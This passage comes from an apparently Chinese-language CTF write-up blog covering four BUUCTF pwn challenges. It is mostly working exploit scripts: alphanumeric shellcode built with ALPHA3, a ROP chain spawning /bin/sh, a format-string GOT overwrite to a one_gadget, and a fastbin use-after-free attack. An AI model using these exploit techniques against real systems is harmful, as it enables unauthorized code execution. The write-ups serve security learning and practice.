[rbp+var_4].text:00000000000011BB 48 98                         cdqe.text:00000000000011BD 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011C5 3C 60                         cmp     al, 60h ; &#39;&#96;&#39;.text:00000000000011C7 7E 11                         jle     short loc_11DA.text:00000000000011C7.text:00000000000011C9 8B 45 FC                      mov     eax, [rbp+var_4].text:00000000000011CC 48 98                         cdqe.text:00000000000011CE 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011D6 3C 7A                         cmp     al, 7Ah ; &#39;z&#39;.text:00000000000011D8 7E 5C                         jle     short loc_1236.text:00000000000011D8.text:00000000000011DA.text:00000000000011DA                               loc_11DA:                               ; CODE XREF: main+72↑j.text:00000000000011DA 8B 45 FC                      mov     eax, [rbp+var_4].text:00000000000011DD 48 98                         cdqe.text:00000000000011DF 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011E7 3C 40                         cmp     al, 40h ; &#39;@&#39;.text:00000000000011E9 7E 11                         jle     short loc_11FC.text:00000000000011E9.text:00000000000011EB 8B 45 FC                      mov     eax, [rbp+var_4].text:00000000000011EE 48 98                         cdqe.text:00000000000011F0 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011F8 3C 5A                         cmp     al, 5Ah ; &#39;Z&#39;.text:00000000000011FA 7E 3A                         jle     short loc_1236<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入字符的<code>ascii</code>码要在<code>(60,74)||(2f,5a)</code>区间内，因此要将生成的<code>shellcode</code>转化成可见字符，要利用<code>alpha3</code>工具</p><p>先生成<code>shellcode</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'z.bin'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后克隆<code>github</code>上的<code>alpha3</code>并运行生成可见字符</p><pre class="line-numbers language-none"><code class="language-none">➜  mrctf2020_shellcode_revenge git clone https:&#x2F;&#x2F;github.com&#x2F;TaQini&#x2F;alpha3.git➜  alpha3 git:(master) ✗ python2 .&#x2F;ALPHA3.py x64 ascii mixedcase rax --input&#x3D;..&#x2F;z.binPh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t% <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将生成的字符直接发送即可</p><h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a><a href="https://buuoj.cn/challenges#picoctf_2018_can_you_gets_me">picoctf_2018_can_you_gets_me</a></h2><p>反编译之后有很多很长名字<code>IO</code>什么的的函数且<code>main</code>函数最后一个是<code>gets</code>，直接找<code>rop</code>发送即可：<code>ROPgadget --binary pwn --ropchain</code></p><p>注意加上<code>from struct import pack</code>并且发送时要先填充完变量和<code>rbp</code></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> packcontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b81c6</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080549db</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 4</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b81c6</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080549db</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08049303</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080549db</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment"># pop ebx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de955</span><span class="token punctuation">)</span> <span class="token comment"># pop ecx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08049303</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806cc25</span><span class="token punctuation">)</span> <span class="token comment"># int 0x80</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'GIVE ME YOUR NAME!'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="axb_2019_fmt64"></a><a href="https://buuoj.cn/challenges#axb_2019_fmt64">axb_2019_fmt64</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  axb_2019_fmt64 checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;axb_2019_fmt64&#x2F;pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反汇编看一下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char s[272]; &#x2F;&#x2F; [rsp+10h] [rbp-250h] BYREF  char format[312]; &#x2F;&#x2F; [rsp+120h] [rbp-140h] BYREF  unsigned __int64 v5; &#x2F;&#x2F; [rsp+258h] [rbp-8h]  v5 &#x3D; __readfsqword(0x28u);  setbuf(stdout, 0LL);  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  puts(    &quot;Hello,I am a computer Repeater updated.\n&quot;    &quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;);  puts(&quot;So I&#39;ll answer whatever you say!&quot;);  while ( 1 )  &#123;    alarm(3u);    memset(s, 0, 0x101uLL);    memset(format, 0, 0x12CuLL);    printf(&quot;Please tell me:&quot;);    read(0, s, 0x100uLL);    sprintf(format, &quot;Repeater:%s\n&quot;, s);    if ( (unsigned int)strlen(format) &gt; 270 )      break;    printf(format);  &#125;  printf(&quot;what you input is really long!&quot;);  exit(0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一道64位的栈上的格式化字符串，直接改<code>printf</code>为<code>ogg</code>即可，需要注意<code>printf</code>的零截断以及改低位时减去<code>Repeater:</code>的长度，可以多次输入但每次会将变量置零，因此只能一次性修改</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29275</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%83$p'</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Repeater:'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x20830</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseprintf <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>ogg1 <span class="token operator">=</span> gadget <span class="token operator">&amp;</span> <span class="token number">0xff</span>ogg2 <span class="token operator">=</span> <span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ogg1 <span class="token operator">-</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%11$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ogg2 <span class="token operator">-</span> ogg1<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%12$hn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wustctf2020-easyfast"><a href="#wustctf2020-easyfast" class="headerlink" title="wustctf2020_easyfast"></a><a href="https://buuoj.cn/challenges#wustctf2020_easyfast">wustctf2020_easyfast</a></h2><p>检查保护，没开地址随机化</p><pre class="line-numbers language-none"><code class="language-none">➜  wustctf2020_easyfast checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wustctf2020_easyfast&#x2F;pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>delete</code>函数中存在<code>UAF</code>漏洞</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 __fastcall delete()&#123;  __int64 index; &#x2F;&#x2F; [rsp+8h] [rbp-28h]  char s[24]; &#x2F;&#x2F; [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v3; &#x2F;&#x2F; [rsp+28h] [rbp-8h]  v3 &#x3D; __readfsqword(0x28u);  puts(&quot;index&gt;&quot;);  fgets(s, 8, stdin);  index &#x3D; atoi(s);  free(buf[index]);                             &#x2F;&#x2F; uaf  return __readfsqword(0x28u) ^ v3;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在一个可以直接<code>getshell</code>的函数，但是要将<code>target</code>值改成<code>0</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 __fastcall show()&#123;  __int64 result; &#x2F;&#x2F; rax  if ( target )    LODWORD(result) &#x3D; puts(&quot;Not yet&quot;);  else    LODWORD(result) &#x3D; system(&quot;&#x2F;bin&#x2F;sh&quot;);  return result;&#125;__int64 __fastcall show()&#123;  __int64 result; &#x2F;&#x2F; rax  if ( target )    LODWORD(result) &#x3D; puts(&quot;Not yet&quot;);  else    LODWORD(result) &#x3D; system(&quot;&#x2F;bin&#x2F;sh&quot;);  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个地址附近能找到两个<code>fake_chunk</code>，由于<code>edit</code>函数中只能输入<code>8</code>个字节因此选择第二个，改<code>fd</code>为<code>fake_chunk</code>地址申请出来再<code>edit</code>将<code>target</code>改成<code>0</code>即可通过<code>vuln</code>函数<code>getshell</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; find_fake_fast 0x602090FAKE CHUNKSFake chunk | Allocated chunkAddr: 0x60206aprev_size: 0x78600007fc46d05size: 0x40fd: 0x00bk: 0x50000000000000fd_nextsize: 0x00bk_nextsize: 0x00Fake chunk | Allocated chunkAddr: 0x602080prev_size: 0x00size: 0x50fd: 0x00bk: 0x00fd_nextsize: 0x7fc46d3e5620bk_nextsize: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token number">0x602090</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>vuln<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 